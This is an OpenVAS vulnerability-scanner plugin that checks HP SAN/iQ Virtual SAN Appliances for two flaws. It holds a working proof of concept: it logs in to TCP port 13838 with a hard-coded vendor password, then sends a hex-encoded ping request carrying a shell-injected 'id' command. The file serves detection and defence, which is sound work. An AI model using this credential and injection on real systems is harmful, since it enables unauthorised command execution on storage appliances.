###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_saniq_virtual_san_app_mult_param_rce_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# HP SAN/iQ Virtual SAN Appliance Multiple Parameters Command Execution Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary commands
  the context of an application.
  Impact Level: System/Application";
tag_affected = "HP SAN/iQ version 9.5 and prior on HP Virtual SAN Appliance";
tag_insight = "The falws are due to,
  - An error in 'lhn/public/network/ping' fails to handle the shell meta
    characters in the first, third and fourth parameters.
  - It has a hard coded password of L0CAlu53R for the global$agent account,
    which allows remote attackers to obtain access to a management service
    via a login request to TCP port 13838.";
tag_solution = "No solution or patch is available as of 06th September 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.hp.com/";
tag_summary = "This host is running HP SAN/iQ Virtual SAN Appliance and is prone
  to multiple command execution vulnerabilities.";

if(description)
{
  script_id(802455);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-2986", "CVE-2012-4362");
  script_bugtraq_id(55133);
  script_tag(name:"cvss_base", value:"7.7");
  script_tag(name:"cvss_base_vector", value:"AV:A/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-09-06 11:32:54 +0530 (Thu, 06 Sep 2012)");
  script_name("HP SAN/iQ Virtual SAN Appliance Multiple Parameters Command Execution Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/84875");
  script_xref(name : "URL" , value : "http://www.osvdb.org/show/osvdb/82087");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/441363");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18893/");

  script_description(desc);
  script_summary("Check if it is possible to execute commands with default credentials");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_require_ports("Services/unknown", 13838);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("misc_func.inc");
include("byte_func.inc");

## Create a packet with  command to be executed
function create_packet()
{
  cmd = ""; packet = "";
  cmd = _FCT_ANON_ARGS[0]; ##  holds command to be executed
  packet = crap(data:raw_string(0x00), length:7) + raw_string(0x01) +
           mkdword(strlen(cmd)) + crap(data:raw_string(0x00), length:15) +
           raw_string(0x14,0xff,0xff,0xff,0xff) + cmd ;
  return packet;
}

function hydra_send_recv()
{
  socket=""; request= ""; header=""; data="";
  socket = _FCT_ANON_ARGS[0];
  request = _FCT_ANON_ARGS[1];

  send(socket:socket, data:request);
  header = recv(socket:socket, length:32);

  data = recv(socket:socket,length:1024);
  return data;
}

port = "";
soc = "";
login = "";
res = "";
req = "";
headr = "";

## get the port
port = get_unknown_svc(13838);
if(!port){
  port = 13838;
}

## exit if any other known service
if(known_service(port:port)){
  exit(0);
}

## Check port status
if(!get_port_state(port)){
  exit(0);
}

## open the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

# login with a hard coded password
login = create_packet('login:/global$agent/L0CAlu53R/Version "9.5.0"');
res = hydra_send_recv(soc, login);

## Confirm login is success
if(res && 'OK: Login' >< res)
{
  req = crap(data:raw_string(0x00), length:7) + raw_string(0x01,0x00,
        0x00, 0x00, 0x3c) + crap(data:raw_string(0x00), length:15) +
        raw_string(0x14, 0xff, 0xff, 0xff, 0xff, 0x67, 0x65, 0x74,
        0x3a, 0x2f, 0x6c, 0x68, 0x6e, 0x2f, 0x70, 0x75, 0x62, 0x6c,
        0x69, 0x63, 0x2f, 0x6e, 0x65, 0x74, 0x77, 0x6f, 0x72, 0x6b,
        0x2f, 0x70, 0x69, 0x6e, 0x67, 0x2f, 0x31, 0x32, 0x37, 0x2e,
        0x30, 0x2e, 0x30, 0x2e, 0x31, 0x2f, 0x31, 0x32, 0x37, 0x2e,
        0x30, 0x2e, 0x30, 0x2e, 0x31, 0x2f, 0x36, 0x34, 0x2f, 0x31,
        0x7c, 0x69, 0x64, 0x20, 0x23, 0x2f, 0x00);

  send(socket:soc, data:req);
  headr = recv(socket:soc, length:32);

  res = recv(socket:soc, length:1024);

}

close(soc);

## confirm the id command result
if(res && egrep(string:res, pattern:'uid=[0-9]+.*gid=[0-9]+.*')){
    security_hole(port:port);
}
